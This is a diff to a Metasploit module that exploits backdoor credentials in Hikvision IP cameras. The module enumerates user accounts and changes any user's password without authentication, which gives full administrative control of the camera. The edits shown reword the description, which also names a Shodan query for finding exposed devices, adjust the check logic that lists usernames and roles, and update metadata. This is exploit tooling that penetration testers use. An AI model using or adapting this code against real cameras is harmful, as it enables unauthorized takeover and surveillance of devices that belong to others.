@@ -14,16 +14,16 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'Hikvision IP Camera Unauthenticated Password Change Via Backdoor Creds',
         'Description' => %q{
-          Many Hikvision IP cameras contain a backdoor that allows unauthenticated impersonation of any configured user account.
+          Many Hikvision IP cameras contain a backdoor credentials that allow unauthenticated impersonation of any configured user account.
           The vulnerability has been present in Hikvision products since 2014. In addition to Hikvision-branded devices, it
           affects many white-labeled camera products sold under a variety of brand names.
 
           Hundreds of thousands of vulnerable devices are still exposed to the Internet at the time
           of publishing (shodan search: '"App-webs" "200 OK"'). Some of these devices can never be patched due to to the
-          vendor not building in mechanisms to allow the affected device to be upgraded to patched firmware.
+          vendor preventing users from upgrading the installed firmware on the affected device.
 
-          This module allows the attacker to perform an unauthenticated password change of any user account on
-          a vulnerable Hikvision IP Camera. Attackers can use this to gain full administrative access to the affected device.
+          This module utilizes these backdoor crednetials to perform an unauthenticated password change of any user account on
+          a vulnerable Hikvision IP Camera. This can then be utilized to gain full administrative access to the affected device.
         },
         'License' => MSF_LICENSE,
         'Author' => [
@@ -41,7 +41,7 @@ class MetasploitModule < Msf::Auxiliary
         'Notes' => {
           'Stability' => [CRASH_SAFE],
           'Reliability' => [REPEATABLE_SESSION],
-          'SideEffects' => []
+          'SideEffects' => [IOC_IN_LOGS]
         }
       )
     )
@@ -105,12 +105,15 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if res.nil?
-      return Exploit::CheckCode::UnexpectedReply('No response recieved from the target!')
+      return Exploit::CheckCode::Unknown('No response recieved from the target!')
     elsif res && res.code == 200
       xml_res = res.get_xml_document
       print_status('Following users are available for password reset...')
-      xml_res.css('User').each do |user|
-        print_status("USERNAME:#{user.at_css('userName').content} | ID:#{user.at_css('id').content} | ROLE:#{user.at_css('userLevel').content}")
+      user_array = xml_res.css('User')
+      return Exploit::CheckCode::Safe('No users were found in the returned CSS code!') if user_array.blank?
+
+      user_array.each do |user|
+        print_status("USERNAME:#{user&.at_css('userName')&.content} | ID:#{user&.at_css('id')&.content} | ROLE:#{user&.at_css('userLevel')&.content}")
       end
       return Exploit::CheckCode::Vulnerable
     else
@@ -151,7 +154,6 @@ class MetasploitModule < Msf::Auxiliary
     else
       print_error('Unknown Error. Password reset was not successful!')
       print_status("Please check the password rules and ensure that the user account/ID:#{datastore['USERNAME']}/#{datastore['ID']} exists!")
-      return
     end
   end
 end
